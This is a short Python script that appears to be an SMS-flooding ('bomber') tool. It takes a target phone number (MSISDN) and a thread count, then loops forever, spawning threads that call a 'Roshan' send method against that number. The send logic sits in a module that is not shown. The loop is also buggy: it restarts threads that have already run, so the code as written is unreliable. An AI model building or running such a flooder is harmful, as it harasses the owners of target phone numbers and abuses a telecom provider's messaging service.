import threading
from typing import List, NoReturn

import click

from utils.core.roshan import Roshan
from utils.logger import logger


@click.command()
@click.option("-MSISDN", type=str, required=True, help="Specify the target MSISDN.")
@click.option("-THREADS", type=int, default=5, help="Specify the threads count.")
def main(msisdn: str, threads: int) -> NoReturn:
    roshan: Roshan = Roshan(msisdn)
    lst: List[threading.Thread] = []

    while True:
        for i in range(threads):
            lst.append(threading.Thread(target=roshan.send))
            logger.info(f"Thread {i!r} successfully started.")

        for thread in lst:
            thread.start()

        for thread in lst:
            thread.join()


if __name__ == "__main__":
    main()
